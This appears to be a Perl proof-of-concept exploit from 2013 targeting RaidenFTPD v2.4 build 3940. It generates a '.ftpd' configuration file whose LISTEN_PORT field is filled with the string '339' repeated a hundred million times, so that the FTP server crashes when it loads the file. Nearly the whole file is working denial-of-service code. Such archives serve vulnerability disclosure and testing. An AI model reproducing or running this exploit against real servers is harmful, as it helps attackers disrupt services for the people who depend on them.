#!/usr/bin/perl
#
#
#
#############################################################
#
# Exploit Title: RaidenFTPD v2.4 build 3940 .ftpd Denial of Service Exploit 
# Date: 2013/6/24 
# Exploit Author: Chako 
# Vendor Homepage: http://www.raidenftpd.com/en/
# Software Download: http://www.raidenmaild.com/download/raidenftpd2.exe
# Version: v2.4
# Tested on: Windows XP SP3 English
#############################################################

$HEADER = "[FTPD]\r\nSERVER_NAME=TEST\r\n".
          "SERVER_IP=127.0.0.1\r\nLISTEN_PORT=";
$PORT   = 339 x 100000000;


open(myfile, '> RaidenFTPD _EXP.ftpd');
print myfile $HEADER.$PORT;
